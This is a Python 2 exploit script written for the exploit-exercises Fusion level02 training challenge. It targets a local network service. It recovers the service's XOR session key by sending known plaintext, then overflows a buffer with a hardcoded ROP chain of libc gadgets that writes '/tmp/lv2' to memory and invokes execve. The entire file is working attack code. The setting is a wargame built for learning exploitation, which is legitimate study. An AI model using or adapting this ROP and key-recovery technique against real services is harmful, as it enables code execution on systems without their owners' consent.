#!/usr/bin/python
# -*- coding: utf-8 -*-
# exploit-exercises - fusion - level02
# exploit by @vnico
# http://vnico.mundodisco.net
import socket
from struct import pack, unpack
from binascii import hexlify

def read_exactly(n,s):
	data = ''
	while(len(data) < n):
		data += s.recv(n-len(data))
	return data

def xor_strings(xs, ys):
	ret = ''
	for i in range(len(xs)):
		ret += chr(ord(xs[i]) ^ ord(ys[i % 128]))
	return ret 



HOST = '127.0.0.1'
PORT = 20002

OP = 'E'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(100000)
s.connect((HOST, PORT))
print '[*] Connecting to service'
print s.recv(57) # Read connection banner
print '[*] Sending initial request'
SZ = pack('<I', 128)
PLAINTEXT = 'A'* 128
s.send(OP + SZ + PLAINTEXT)
print read_exactly(120, s) # Read message "encryption complete..."
size_packed = s.recv(4)
size_unpacked = unpack('<I', size_packed)[0]
print '[*] Received {0} bytes crypted'.format(size_unpacked)
crypted = read_exactly(size_unpacked, s)
key = xor_strings(crypted, 'A'*128)
print '[*] The key for this session is: {0}'.format(key.encode('hex'))

print '[*] Exploiting bug...'
base = 0xb759b000
rop = (
# /tmp/lv2
pack('<I', (base + 0xd5c41)), # : pop ecx ; pop eax ;;
pack('<I', 0x0804b410+4), # (start of .data) --> 
'/tmp',
pack('<I', base + 0x6cc5a), #: mov [ecx] eax ;;

pack('<I', (base + 0xd5c41)), # : pop ecx ; pop eax ;;
pack('<I', 0x0804b410+8),
'/lv2',
pack('<I', base + 0x6cc5a), #: mov [ecx] eax ;;

pack('<I', base + 0x33bb5),# : xor eax eax ;;
pack('<I', base + 0x1aa6),#: pop edx ;;
pack('<I', 0x0804b410+12-0x18),
pack('<I', base + 0x2da62),#: mov [edx+0x18] eax ;;

pack('<I', base + 0x2da2b),#: pop ecx ; pop edx ;;
pack('<I', 0x0804b410+12),
pack('<I', 0x0804b410+12),

pack('<I', base + 0x193f5),#: pop ebx ;;
pack('<I', 0x0804b410+4),
pack('<I', base + 0x7cc98),#: add eax 0xb ;;
pack('<I', base + 0x9c3f5)#: call gs:[0x10] ;;
)

# /opt/metasploit-framework/tools/pattern_offset.rb 4d36624d 132136
SZ = pack('<I', 131092-4+len(''.join(rop)))
PLAINTEXT = 'A'*131088 + ''.join(rop) 
PLAINTEXT_XORED = xor_strings(PLAINTEXT, key)
s.send(OP + SZ)
s.sendall(PLAINTEXT_XORED)

print '[*] Sending quit'
s.send('Q')

s.close()
